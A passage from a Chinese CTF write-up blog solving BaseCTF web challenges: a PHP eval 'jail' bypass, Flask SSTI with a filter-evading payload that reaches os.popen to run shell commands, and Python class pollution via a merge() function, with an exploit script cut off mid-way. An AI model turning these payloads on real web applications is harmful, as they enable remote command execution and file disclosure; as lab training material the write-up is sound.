class="string">&quot;3416a75f4cea9109507cacd8e2f2aefc&quot;</span>,</span><br><span class="line">            <span class="string">&quot;7f6ffaa6bb0b408017b62254211691b5&quot;</span>, <span class="string">&quot;1c383cd30b7c298ab50293adfecb7b18&quot;</span>, <span class="string">&quot;182be0c5cdcd5072bb1864cdee4d3d6e&quot;</span>,</span><br><span class="line">            <span class="string">&quot;9f61408e3afb633e50cdf1b20de6f466&quot;</span>, <span class="string">&quot;e369853df766fa44e1ed0ff613f563bd&quot;</span>, <span class="string">&quot;d67d8ab4f4c10bf22aa353e27879133c&quot;</span>,</span><br><span class="line">            <span class="string">&quot;d9d4f495e875a2e075a1a4a6e1b9770f&quot;</span>, <span class="string">&quot;d645920e395fedad7bbbed0eca3fe2e0&quot;</span>, <span class="string">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span>,</span><br><span class="line">            <span class="string">&quot;a0a080f42e6f13b3a2df133f073095dd&quot;</span>, <span class="string">&quot;ec5decca5ed3d6b8079e2e7e7bacc9f2&quot;</span>, <span class="string">&quot;3416a75f4cea9109507cacd8e2f2aefc&quot;</span>,</span><br><span class="line">            <span class="string">&quot;17e62166fc8586dfa4d1bc0e1742c08b&quot;</span>, <span class="string">&quot;c0c7c76d30bd3dcaefc96f40275bdc0a&quot;</span>, <span class="string">&quot;735b90b4568125ed6c3f678819b6e058&quot;</span>,</span><br><span class="line">            <span class="string">&quot;70efdf2ec9b086079795c442636b55fb&quot;</span>, <span class="string">&quot;3c59dc048e8850243be8079a5c74d079&quot;</span>, <span class="string">&quot;14bfa6bb14875e45bba028a21ed38046&quot;</span>,</span><br><span class="line">            <span class="string">&quot;7cbbc409ec990f19c78c75bd1e06f215&quot;</span>, <span class="string">&quot;1f0e3dad99908345f7439f8ffabdffc4&quot;</span>, <span class="string">&quot;34173cb38f07f89ddbebc2ac9128303f&quot;</span>,</span><br><span class="line">            <span class="string">&quot;6f4922f45568161a8cdf4ad2299f6d23&quot;</span>, <span class="string">&quot;c16a5320fa475530d9583c34fd356ef5&quot;</span>, <span class="string">&quot;28dd2c7955ce926456240b2ff0100bde&quot;</span>,</span><br><span class="line">            <span class="string">&quot;6f4922f45568161a8cdf4ad2299f6d23&quot;</span>, <span class="string">&quot;1f0e3dad99908345f7439f8ffabdffc4&quot;</span>, <span class="string">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> hashlib.md5(<span class="built_in">str</span>(j).encode()).hexdigest() == md5_flag[i]:</span><br><span class="line">            flag += <span class="built_in">chr</span>(i^j)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="ez-php-jail"><a href="#ez-php-jail" class="headerlink" title="ez_php_jail"></a>ez_php_jail</h2><h3 id="考点：-15"><a href="#考点：-15" class="headerlink" title="考点："></a>考点：</h3><p><strong>当 php 版本⼩于 8 时，GET 请求的参数名含有 . ，会被转为 _ ，但是如果参数名中有 [ ，这</strong></p><p><strong>个 [ 会被直接转为 _ ，但是后⾯如果有 . ，这个 . 就不会被转为 _ 。</strong></p><hr><p><strong>glob（）函数：</strong></p><p><strong>glob() 函数返回匹配指定模式的文件名或目录。</strong></p><p><strong>该函数返回一个包含有匹配文件 &#x2F; 目录的数组。如果出错返回 false。</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731751822850-ff1d9839-8225-4c65-98a0-8030fcd14fd7.png" referrerpolicy="no-referrer"></p><p><strong>highlight_file() 函数</strong></p><p>highlight_file() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。</p><p><strong>提示：****用于高亮的颜色可通过 php.ini 文件进行设置或者通过调用 ini_set() 函数进行设置。</strong></p><p><strong>注释：当使用该函数时，整个文件都将被显示，包括密码和其他敏感信息！</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731752968766-5dc24e91-b2e5-4c30-bc56-dabed7536f9f.png" referrerpolicy="no-referrer"></p><h3 id="题解：-15"><a href="#题解：-15" class="headerlink" title="题解："></a>题解：</h3><p>进入题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 使用highlight_file函数以语法高亮的形式输出当前正在执行的PHP文件（即__FILE__所代表的这个文件）的源代码。</span></span><br><span class="line"><span class="comment">// 这通常在代码调试、展示代码示例等场景下比较有用，方便查看代码结构和语法。</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 将PHP的错误报告级别设置为0，也就是关闭错误报告功能。</span></span><br><span class="line"><span class="comment">// 这样在代码执行过程中，即使出现了PHP错误（如语法错误、运行时错误等），也不会在页面上显示相应的错误信息。</span></span><br><span class="line"><span class="comment">// 但在实际开发中，一般不建议这样做，因为及时查看错误信息有助于快速定位和解决问题。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用include语句包含一个名为&quot;hint.html&quot;的文件。</span></span><br><span class="line"><span class="comment">// 这意味着会将&quot;hint.html&quot;文件中的内容嵌入到当前PHP文件执行的位置。</span></span><br><span class="line"><span class="comment">// 通常用于引入一些额外的提示信息、页面布局相关的HTML内容等。</span></span><br><span class="line"><span class="comment">// 需要注意的是，如果&quot;hint.html&quot;文件不存在或者路径不正确，可能会导致警告或错误（不过由于设置了关闭错误报告，可能看不到这些提示）。</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;hint.html&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 从通过HTTP GET方法提交的请求参数中获取名为&quot;Jail_by.Happy&quot;的参数值，并将其赋值给变量$Jail。</span></span><br><span class="line"><span class="comment">// 这表明外部可以通过在访问该PHP页面的URL中添加相应的参数（例如：http://example.com/this_file.php?Jail_by.Happy=some_value）来传递数据给这个脚本，进而影响后续代码的执行。</span></span><br><span class="line"><span class="variable">$Jail</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Jail_by.Happy&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断变量$Jail的值是否为null，即检查是否成功获取到了名为&quot;Jail_by.Happy&quot;的GET参数。</span></span><br><span class="line"><span class="comment">// 如果$Jail的值为null，说明没有接收到该参数，那么就执行die函数，输出提示信息&quot;Do You Like My Jail?&quot;，然后终止脚本的执行。</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$Jail</span> == <span class="literal">null</span>) <span class="keyword">die</span>(<span class="string">&quot;Do You Like My Jail?&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个名为Like_Jail的函数，该函数接受一个参数$var，用于对传入的字符串进行特定规则的检查。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Like_Jail</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 在函数内部，使用preg_match函数结合正则表达式对传入的参数$var进行匹配检查。</span></span><br><span class="line">    <span class="comment">// 正则表达式&#x27;/(`|\$|a|c|s|require|include)/i&#x27;的含义是：不区分大小写地检查字符串$var中是否包含反引号（`）、美元符号（$）、字母a、字母c、字母s、require关键字或者include关键字。</span></span><br><span class="line">    <span class="comment">// 如果在$var中匹配到了上述任何一个字符，就返回false，表示该字符串不符合函数所设定的要求。</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(`|\$|a|c|s|require|include)/i&#x27;</span>, <span class="variable">$var</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果在$var中没有匹配到上述被限制的字符，就返回true，表示该字符串符合函数所设定的要求。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用Like_Jail函数，并将变量$Jail作为参数传入，对获取到的$Jail变量的值进行检查。</span></span><br><span class="line"><span class="comment">// 根据Like_Jail函数的返回结果来决定后续的操作。</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">Like_Jail</span>(<span class="variable">$Jail</span>)) &#123;</span><br><span class="line">    <span class="comment">// 如果Like_Jail函数返回true，说明变量$Jail的值符合函数内部设定的要求，此时就使用eval函数来执行变量$Jail所代表的PHP代码。</span></span><br><span class="line">    <span class="comment">// 需要注意的是，eval函数是一个非常危险的函数，因为它可以直接执行传入的任意PHP代码，</span></span><br><span class="line">    <span class="comment">// 如果外部传入了恶意代码，那么这些恶意代码将会被执行，从而可能导致安全漏洞，如服务器被入侵、数据泄露等问题。</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$Jail</span>); </span><br><span class="line">    <span class="comment">// 在eval函数成功执行完变量$Jail所代表的PHP代码后，输出提示信息&quot;Yes! you escaped from the jail! LOL!&quot;。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Yes! you escaped from the jail! LOL!&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果Like_Jail函数返回false，说明变量$Jail的值不符合函数内部设定的要求，此时输出提示信息&quot;You will Jail in your life!&quot;。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You will Jail in your life!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出一个换行符，用于在页面输出结果中进行换行，使输出内容更加清晰、美观，便于阅读。</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 此处注释提到在HTML解析后再输出PHP源代码，但从当前给出的代码来看，并没有明确体现出如何在HTML解析后准确输出PHP源代码的具体实现逻辑。</span></span><br><span class="line"><span class="comment">// 可能需要结合其他相关代码（如在HTML模板中通过特定的标签或脚本逻辑来实现等）来完成这一操作，但仅就这段代码而言，无法确定具体的实现方式。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ctrl+U 查看源码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731752361480-30d40cf5-0310-4a40-8042-63d5a27a0028.png" referrerpolicy="no-referrer"></p><p>解码一下，得到</p><blockquote><p>ph0_info_Like_jail.php</p></blockquote><p>访问这个页面，得到 phpinfo</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731752527774-9b11bc5e-f22b-4eb9-a75c-86afbb49e436.png" referrerpolicy="no-referrer"></p><p>我们只是用 glob（）函数没有用，因为我们只返回了一个文件路径</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731752693627-f29aa4a0-ac2b-4da7-bd4c-3cc896fea424.png" referrerpolicy="no-referrer"></p><p>借助 highlight_file（）函数高亮显示文件中的代码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731752846423-cad02c4e-f445-4449-ab13-28f11b32e8e8.png" referrerpolicy="no-referrer"></p><h2 id="复读机"><a href="#复读机" class="headerlink" title="复读机"></a>复读机</h2><h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><p><strong>SSTI(模板注入)：</strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html"><strong>参考文章</strong></a></p><p>当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p><p><strong>常用的类和方法</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__class__用来查看变量所属的类</span><br><span class="line"></span><br><span class="line">__bases__用来查看类的基类，就是父类（或者__base__）</span><br><span class="line"></span><br><span class="line">__mro__：显示类和基类</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__subclasses__</span>()：查看当前类的子类</span><br><span class="line"></span><br><span class="line">__getitem__：对数组字典的内容提取</span><br><span class="line"></span><br><span class="line">__init__  : 初始化类，返回的类型是<span class="function"><span class="keyword">function</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">__globals__</span>:查看全局变量，有哪些可用的函数方法等，然后再搜索<span class="title">popen</span>，<span class="title">eval</span>等</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">__builtins__</span>:提供对<span class="title">Python</span>的所有&quot;内置&quot;标识符的直接访问,即先加载内嵌函数再调用</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">__import__</span>   ： 动态加载类和函数，用于导入模块，经常用于导入<span class="title">os</span>模块（例如<span class="title">__import__</span>(<span class="params"><span class="string">&#x27;os&#x27;</span></span>).<span class="title">popen</span>(<span class="params"><span class="string">&#x27;ls&#x27;</span></span>).<span class="title">read</span>(<span class="params"></span>)）</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">url_for</span> ：<span class="title">flask</span>的方法，可以用于得到<span class="title">__builtins__</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">lipsum</span> ：<span class="title">flask</span>的一个方法，可以用于得到<span class="title">__builtins__</span>，而且<span class="title">lipsum</span>.<span class="title">__globals__</span>含有<span class="title">os</span>模块：</span>&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].<span class="title function_ invoke__">popen</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="title function_ invoke__">read</span>()&#125;&#125;</span><br><span class="line"></span><br><span class="line">config：当前application的所有配置。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">popen</span>():执行一个 shell 以运行命令来开启一个进程</span><br><span class="line"></span><br><span class="line">request.args.key：获取get传入的key的值</span><br></pre></td></tr></table></figure><p><strong>SSTI漏洞利用基本流程</strong></p><p>获取当前类 -&gt; 获取其object基类 -&gt; 获取所有子类 -&gt; 获取可执行shell命令的子类 -&gt; 获取可执行shell命令的方法 -&gt; 执行shell命令</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>发现对关键字和一些符号有过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ - * / . &#123;&#123; &#125;&#125; __ : &quot; \</span><br></pre></td></tr></table></figure><p>获取’’的类</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731821091968-b57a671e-5b41-41de-aaa0-fed672ac826b.png" referrerpolicy="no-referrer"></p><p>再获取基类‘object’</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731821183133-e0faf2d1-f446-483d-aed0-7b47715480de.png" referrerpolicy="no-referrer"></p><p>再获取‘object’的所有派生类</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731821505936-04dd4a83-9a0a-4ed0-8023-0d771dd5f028.png" referrerpolicy="no-referrer"></p><p>在网页里看不下来，到 burp 里看</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731821521645-e7565e8b-0c60-4cc2-937b-010c8c7db68d.png" referrerpolicy="no-referrer"></p><p>寻找可以 RCE 的类，使用数组序号选择这个类</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731821707338-751a9eaa-9ad9-43cc-b52d-c53b67b83c07.png" referrerpolicy="no-referrer"></p><p>然后创建类，然后 globals 获取所有模块和方法，寻找可以读代码的方法</p><p><strong>os.popen() 方法用于从一个命令打开一个管道。</strong></p><p>因为禁用了&#x2F;，所以找方法进入根目录</p><p><strong>使用环境变量</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731823845600-a161606b-02f4-49d2-80c7-5522eb1820d4.png" referrerpolicy="no-referrer"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731821780964-c841daf5-6d90-4a1c-8a65-b9e6deccc411.png" referrerpolicy="no-referrer"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731821851494-27ea41df-e0b1-4014-915d-f9674127a095.png" referrerpolicy="no-referrer"></p><p>最终输入如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%<span class="keyword">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cla&#x27;</span><span class="string">&#x27;ss_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcl&#x27;</span><span class="string">&#x27;asses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>][<span class="string">&#x27;cd $OLDPWD;cat flag&#x27;</span>][<span class="string">&#x27;re&#x27;</span><span class="string">&#x27;ad&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731822491307-f54972de-ffb4-4bb3-a5b6-f8e5079054ee.png" referrerpolicy="no-referrer"></p><h1 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h1><h2 id="圣钥之战1-0"><a href="#圣钥之战1-0" class="headerlink" title="圣钥之战1.0"></a>圣钥之战1.0</h2><h3 id="考点：-16"><a href="#考点：-16" class="headerlink" title="考点："></a>考点：</h3><p><strong>merge（）函数：</strong></p><p><strong>Python原型链污染：</strong><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13072?time__1311=GqmhBKwKGNDKKYIq7I7xiqY5QaTNmeD"><strong>参考文章</strong></a></p><p><strong>主要原理还是通过 merge 函数往对象树里合并内容</strong></p><p><strong>这题的原理就是通过污染 __file__，再利用这个玩意，在&#x2F;read 界面把 flag 爆出来</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731827711350-d6c03765-f397-406c-be3b-caf2cdb2b98e.png" referrerpolicy="no-referrer"></p><h3 id="题解：-16"><a href="#题解：-16" class="headerlink" title="题解："></a>题解：</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731824278016-d689e685-623f-4393-85b4-e74b5dc756f8.png" referrerpolicy="no-referrer"></p><p>进入&#x2F;read，看到 python 的 flask 框架，下面只列出关键部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    这个函数的目的是将源字典（src）中的键值对合并到目标对象（dst）中。</span></span><br><span class="line"><span class="string">    如果遇到源字典中的值也是字典类型，会递归地进行合并操作。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">    - src：源字典，包含要合并到目标对象中的键值对。</span></span><br><span class="line"><span class="string">    - dst：目标对象，可以是字典或者具有属性的对象，用于接收源字典合并过来的内容。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        遍历源字典src中的每一个键值对。</span></span><br><span class="line"><span class="string">        k是键，v是对应的值。</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            检查目标对象dst是否具有通过键获取值的能力（类似字典的__getitem__方法）。</span></span><br><span class="line"><span class="string">            这通常意味着dst可能是一个字典或者类似字典行为的对象。</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                如果目标对象dst中已经存在键k对应的键值对，并且当前源字典中的值v是一个字典类型，</span></span><br><span class="line"><span class="string">                那么就需要递归地调用merge函数，将v这个字典与dst中键k对应的字典进行进一步的合并操作。</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span></span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">                <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                如果目标对象dst中不存在键k对应的键值对，或者当前源字典中的值v不是字典类型，</span></span><br><span class="line"><span class="string">                那么就直接将源字典中的键值对（k, v）添加到目标对象dst中。</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            如果目标对象dst不具有通过键获取值的能力（不类似字典的__getitem__方法），</span></span><br><span class="line"><span class="string">            但是具有名为k的属性，并且当前源字典中的值v是一个字典类型，</span></span><br><span class="line"><span class="string">            那么就需要递归地调用merge函数，将v这个字典与dst的属性k对应的对象进行进一步的合并操作。</span></span><br><span class="line"><span class="string">            这里通过getattr函数获取dst的属性k对应的对象。</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            如果以上条件都不满足，即目标对象dst既不具有通过键获取值的能力，</span></span><br><span class="line"><span class="string">            也不存在名为k的属性，或者当前源字典中的值v不是字典类型，</span></span><br><span class="line"><span class="string">            那么就直接通过setattr函数将源字典中的键值对（k, v）设置为目标对象dst的属性。</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义了一个路由，路径为&#x27;/pollute&#x27;，并且支持GET和POST两种请求方法</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pollute&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Pollution</span>():</span><br><span class="line">    <span class="comment"># 判断接收到的请求是否是JSON格式的数据</span></span><br><span class="line">    <span class="keyword">if</span> request.is_json:  </span><br><span class="line"><span class="comment"># 如果是JSON格式，就调用merge函数（这里假设merge函数已定义且在当前作用域可调用），将解析后的请求数据（通过json.loads将JSON字符串转换为Python对象）和instance（这里应该是一个事先定义好的对象，可能用于存储某种状态或数据）进行合并操作</span></span><br><span class="line">        merge(json.loads(request.data), instance) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 如果接收到的请求不是JSON格式，就返回这条提示信息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;J1ngHong说：钥匙圣洁无暇，无人可以污染！&quot;</span>  </span><br><span class="line">    <span class="comment"># 如果成功执行了前面的merge操作（即请求是JSON格式且merge函数执行无误），就返回这条提示信息&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;J1ngHong说：圣钥暗淡了一点，你居然污染成功了？&quot;</span>  </span><br></pre></td></tr></table></figure><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造污染原型链的 JSON 请求</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;__file__&quot;</span>: <span class="string">&quot;/flag&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 payload 转换为 JSON 字符串</span></span><br><span class="line">json_payload = json.dumps(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 POST 请求到 /pollute 